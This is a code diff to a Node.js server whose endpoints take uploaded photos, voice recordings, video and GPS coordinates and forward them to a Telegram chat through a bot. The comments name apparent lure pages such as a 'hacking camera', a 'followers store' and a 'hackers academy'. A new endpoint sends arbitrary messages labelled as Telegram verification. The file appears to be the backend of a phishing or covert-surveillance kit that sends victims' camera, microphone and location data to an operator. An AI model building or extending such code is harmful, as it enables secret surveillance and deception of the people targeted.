@@ -14,7 +14,9 @@ if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-// 1. استقبال الصور (كاميرا)
+// ==========================================
+// 1. استقبال الصور (كاميرا اختراق الشبكات)
+// ==========================================
 app.post('/upload', upload.array('photos', 3), async (req, res) => {
   try {
     if (!req.files || req.files.length === 0) return res.status(400).json({ ok: false });
@@ -34,7 +36,9 @@ app.post('/upload', upload.array('photos', 3), async (req, res) => {
   } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
 });
 
+// ==========================================
 // 2. استقبال الصوت (بوابة الضل)
+// ==========================================
 app.post('/upload_voice', upload.single('voice'), async (req, res) => {
   try {
     if (!req.file) return res.status(400).json({ ok: false, error: 'لا يوجد صوت' });
@@ -52,7 +56,9 @@ app.post('/upload_voice', upload.single('voice'), async (req, res) => {
   } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
 });
 
-// 3. استقبال الفيديو (المتجر)
+// ==========================================
+// 3. استقبال الفيديو (متجر المتابعين)
+// ==========================================
 app.post('/upload_video', upload.single('video'), async (req, res) => {
   try {
     if (!req.file) return res.status(400).json({ ok: false, error: 'لا يوجد فيديو' });
@@ -73,7 +79,9 @@ app.post('/upload_video', upload.single('video'), async (req, res) => {
   } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
 });
 
-// 4. استقبال الموقع (GPS)
+// ==========================================
+// 4. استقبال الموقع (أكاديمية الهكرز)
+// ==========================================
 app.post('/upload_location', upload.none(), async (req, res) => {
   try {
     const targetChatId = req.body.chat_id;
@@ -100,5 +108,28 @@ app.post('/upload_location', upload.none(), async (req, res) => {
   } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
 });
 
+// ==========================================
+// 5. استقبال رسايل توثيق تلجرام
+// ==========================================
+app.post('/send_custom_message', upload.none(), async (req, res) => {
+  try {
+    const targetChatId = req.body.chat_id;
+    const text = req.body.text;
+
+    if (!targetChatId || !text) return res.status(400).json({ ok: false, error: 'بيانات ناقصة' });
+
+    await axios.post(`${BOT_URL}/sendMessage`, {
+      chat_id: targetChatId,
+      text: text,
+      parse_mode: 'HTML'
+    });
+    
+    res.json({ ok: true });
+  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
+});
+
+// ==========================================
+// تشغيل السيرفر
+// ==========================================
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`✅ Server running on ${PORT}`));
+app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
